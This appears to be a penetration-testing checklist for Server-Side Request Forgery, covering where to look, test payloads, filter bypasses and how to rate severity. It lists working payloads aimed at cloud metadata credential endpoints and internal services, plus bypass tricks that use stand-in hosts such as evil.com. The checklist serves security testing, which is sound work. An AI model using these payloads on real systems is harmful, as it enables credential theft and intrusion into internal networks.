---
title: "Server-Side Request Forgery (SSRF)"
---

## What It Is

SSRF tricks the server into making requests to unintended destinations — internal services, cloud metadata endpoints, or arbitrary external hosts.

## Where to Look

- URL/webhook input fields ("Enter URL to fetch")
- PDF generators, screenshot services
- Image/file import from URL
- OAuth callbacks
- API proxy endpoints
- RSS/feed parsers
- Any parameter that accepts a URL

## Testing

```bash
# Basic — does the server fetch your URL?
# Use Burp Collaborator, webhook.site, or interactsh
https://YOUR-CALLBACK-SERVER/ssrf-test

# Internal hosts
http://127.0.0.1
http://localhost
http://0.0.0.0
http://[::1]

# Cloud metadata endpoints
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP
http://metadata.google.internal/computeMetadata/v1/

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# Internal services
http://127.0.0.1:6379      # Redis
http://127.0.0.1:9200      # Elasticsearch
http://127.0.0.1:27017     # MongoDB
http://127.0.0.1:8500      # Consul
http://127.0.0.1:2379      # etcd
```

## Filter Bypasses

```bash
# Decimal IP
http://2130706433           # = 127.0.0.1

# Hex IP
http://0x7f000001           # = 127.0.0.1

# Octal
http://0177.0.0.1

# IPv6
http://[::ffff:127.0.0.1]
http://[0:0:0:0:0:ffff:127.0.0.1]

# DNS rebinding — use a domain that resolves to 127.0.0.1
# Use services like nip.io
http://127.0.0.1.nip.io

# URL schema bypass
http://localhost:80@evil.com
http://evil.com#@localhost

# Redirect-based
# Host a redirect on your server: 302 → http://169.254.169.254/
http://YOUR-SERVER/redirect

# Double encoding
http://127.0.0.1%2500
```

## Proving Impact

The severity depends on what you can reach:

| What You Can Access | Severity |
|--------------------|----------|
| Cloud metadata with IAM creds | Critical |
| Internal admin panels | High |
| Internal APIs / services | High |
| Port scan internal network | Medium |
| Read local files (via file://) | High |
| Only external callback | Low (blind SSRF) |

## Findings

| Endpoint | Parameter | What's Reachable | Impact | Status |
|----------|-----------|-----------------|--------|--------|
| | | | | |
